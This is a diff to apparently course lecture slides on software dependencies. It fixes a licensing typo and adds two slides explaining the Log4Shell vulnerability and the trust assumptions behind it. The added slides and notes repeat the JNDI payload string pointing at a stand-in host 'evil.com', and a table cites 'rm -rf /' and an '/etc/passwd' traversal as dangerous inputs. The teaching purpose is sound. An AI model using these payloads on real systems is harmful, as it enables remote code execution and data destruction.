@@ -884,7 +884,7 @@ Style: Warm, clean editorial illustration. Three equal-width panels with clear v
 
 **The SSPL controversy:**
 - MongoDB moved from AGPL to SSPL
-- SSPL: if you offer the software as a service, open-source your ENTIRE stack, including any related tools or infrastructure tha tyou use to MANAGE that software-as-a-service operation!
+- SSPL: if you offer the software as a service, open-source your ENTIRE stack, including any related tools or infrastructure that you use to MANAGE that software-as-a-service operation!
 - OSI says this isn't "open source" — it's "source available"
 
 → **Transition:** Now let's talk about evaluating dependencies...
@@ -1254,6 +1254,155 @@ An attacker compromises a package deep in the dependency tree. Your app pulls it
 3. A malicious actor compromises the library or its dependencies
 
 → **Transition:** So what can YOU do about this?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Log4Shell: When a Logging Library Became an Attack Vector
+
+<p style={{fontSize: '0.85em'}}>
+In December 2021, a critical vulnerability in <strong>Log4j</strong> — a ubiquitous Java logging library — exposed millions of systems to remote code execution. This is the supply chain attack that changed how the industry thinks about dependencies.
+</p>
+
+<div style={{fontSize: '0.62em', marginTop: '0.75em'}}>
+
+```mermaid
+sequenceDiagram
+    participant Attacker
+    participant YourApp as Your Application
+    participant Log4j
+    participant LDAP as Attacker's LDAP Server
+    participant Malware as Malicious Code
+
+    Attacker->>YourApp: Send malicious string in any logged field<br/>(username, search query, User-Agent...)
+    YourApp->>Log4j: log.info("User login: " + username)
+    Note over Log4j: Log4j sees ${jndi:ldap://evil.com/a}<br/>and EXECUTES it as a lookup
+    Log4j->>LDAP: Fetch ldap://evil.com/a
+    LDAP->>Log4j: Return reference to Malware.class
+    Log4j->>Malware: Load and execute attacker's code
+    Note over Malware: Full control of your server
+```
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.75em', padding: '0.5em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.75em'}}>
+
+**The attack in plain English:** Log4j had a "helpful" feature that let logged strings contain lookups like `${jndi:ldap://...}`. If an attacker put this string *anywhere* your app logged — a username field, a search box, even a browser User-Agent header — Log4j would fetch and execute code from the attacker's server.
+
+</div>
+
+<aside className="notes">
+**Why Log4Shell was so devastating:**
+
+1. **Ubiquity:** Log4j is THE standard Java logging library. It's in nearly every Java application — including ones you've never heard of that run inside products you use daily. Minecraft, iCloud, Steam, Twitter — all affected.
+
+2. **Trivial to exploit:** The attacker just needs to get a malicious string logged. That's it. Send `${jndi:ldap://evil.com/a}` as your username, in a search query, in a User-Agent header, in a chat message — anywhere the app logs user input.
+
+3. **The "feature" that became a vulnerability:**
+   - Log4j supported "lookups" — variable substitution in log messages
+   - `${env:USER}` would expand to the username
+   - `${jndi:ldap://...}` would fetch data from an LDAP server
+   - The JNDI lookup could return a Java class reference — which Log4j would then LOAD AND EXECUTE
+   - This was a documented feature, not a bug — it was DESIGNED to do this
+
+4. **Why it went undetected for 8+ years:**
+   - The feature was added in 2013
+   - Security researchers weren't looking at logging libraries for RCE
+   - The feature was obscure — most developers didn't know it existed
+   - Code audits focused on "obvious" attack surfaces like web endpoints
+   - Nobody thought "what if someone logs a malicious string?" because logging feels safe
+
+**The remediation nightmare:**
+- You don't just update YOUR Log4j — you update every dependency that includes it
+- Some apps bundled Log4j inside other JARs (shaded dependencies)
+- Some vendors took weeks to release patches
+- Some systems couldn't be updated without breaking other things
+
+→ **Transition:** This connects directly to L20's security concepts...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Why Nobody Saw It Coming: "It's Just Logging"
+
+<p style={{fontSize: '0.82em'}}>
+You wouldn't pass user input directly to dangerous operations. But <strong>logging doesn't feel dangerous</strong>.
+</p>
+
+<div style={{fontSize: '0.63em', marginTop: '0.75em'}}>
+
+| Operation | Would You Pass User Input Directly? |
+|-----------|-------------------------------------|
+| `Runtime.exec("rm " + userInput)` | **No way!** User could type ` -rf /` and delete everything |
+| `new File(userInput).delete()` | **No way!** User could type `../../../etc/passwd` |
+| `log.info("User searched for: " + userInput)` | **Sure, why not?** It's just writing text to a file... |
+
+</div>
+
+<div className="fragment" style={{fontSize: '0.55em', marginTop: '0.75em'}}>
+
+```mermaid
+graph LR
+    subgraph "Your Mental Model"
+        Input["User Input"] -->|"Obviously dangerous"| Exec["Runtime.exec()"]
+        Input -->|"Obviously dangerous"| File["File operations"]
+        Input -->|"It's just text..."| Log["log.info()"]
+    end
+
+    subgraph "Log4j's Reality"
+        Log -->|"Parse for ${...}"| Lookup["Variable Lookup"]
+        Lookup -->|"Execute JNDI"| Network["Network Request"]
+        Network -->|"Load class"| RCE["Code Execution"]
+    end
+
+    style Log fill:#FF980044,stroke:#FF9800,stroke-width:3px
+    style RCE fill:#f4433644,stroke:#f44336
+```
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.5em', padding: '0.5em', backgroundColor: 'rgba(244, 67, 54, 0.1)', borderRadius: '8px', fontSize: '0.75em'}}>
+
+**The trust assumption that broke:** Every developer assumed `log.info(userInput)` was a *sink* — data goes in, gets written to a file, nothing else happens. Log4j made it a *source* of network requests and code execution. Logging became as dangerous as `Runtime.exec()` — but nobody knew.
+
+</div>
+
+<aside className="notes">
+**The psychology of why this went undetected:**
+
+1. **Mental model of logging:**
+   - Logging feels like `System.out.println()` — it just writes text somewhere
+   - Nobody thinks "what if the logging library executes my strings?"
+   - Everyone knows not to pass user input to Runtime.exec() or ProcessBuilder
+   - But logging? That's just... printing. What could go wrong?
+
+2. **The trust assumption:**
+   - You would NEVER write: `Runtime.exec(userInput)` — that's obviously dangerous
+   - But `log.info(userInput)`? That seems completely safe
+   - Log4j's lookup feature meant logging WAS like Runtime.exec()
+   - `${jndi:ldap://evil.com}` wasn't "text to write" — it was "instruction to execute"
+
+3. **Connect to L20's trust boundaries:**
+   - L20 taught: "Draw lines where trust ends — validate everything that crosses"
+   - You drew your boundary at the API. Log4j had a HIDDEN boundary you didn't know about.
+   - Your user input crossed YOUR trust boundary (validated) → then crossed Log4j's hidden boundary (not validated) → remote code execution
+
+4. **The "Fallacy 4" extension:**
+   - L20 Fallacy 4: "The network is secure" — you can't trust network traffic
+   - Log4Shell adds: "The dependency is secure" — you can't blindly trust what dependencies do with your data
+   - The network between your code and Log4j is "safe" (same JVM), but the TRUST wasn't safe
+
+**The architectural lesson:**
+- Your trust boundary extends through your entire dependency tree
+- A "safe" operation (logging) became unsafe because of how a dependency implemented it
+- This is why dependency hygiene is a security practice, not just housekeeping
+- Tools like Dependabot, Snyk scan for known vulnerabilities — use them
+
+→ **Transition:** So what can YOU do to be a responsible participant in this ecosystem?
 </aside>
 
 </Slide>
